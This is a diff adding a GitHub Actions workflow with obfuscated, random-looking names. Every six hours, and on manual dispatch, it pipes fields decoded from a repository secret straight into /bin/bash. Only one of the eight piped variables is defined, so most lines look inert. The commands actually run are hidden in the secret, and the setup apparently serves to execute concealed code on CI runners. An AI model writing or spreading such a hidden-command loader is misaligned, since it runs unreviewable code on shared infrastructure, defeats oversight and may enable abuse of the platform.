@@ -1,0 +1,24 @@
+name: wozaixianshishijedeshihoumeitiandou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wozaixianshishijedeshihoumeitiandou
+        env:
+          nlopw1873: ${{ secrets.nlopw1873 }}
+        run: |
+          echo $nlopw1873 | jq -r .dkfvc574 | /bin/bash
+          echo $t6 | jq -r .b7762 | /bin/bash
+          echo $yrpqk06958 | jq -r .a1230 | /bin/bash
+          echo $k75 | jq -r .lsa574 | /bin/bash
+          echo $f448 | jq -r .d7 | /bin/bash
+          echo $ekspx86 | jq -r .d4492 | /bin/bash
+          echo $sz8240 | jq -r .q5 | /bin/bash
+          echo $tlsvb96017 | jq -r .mbuy7976 | /bin/bash
+
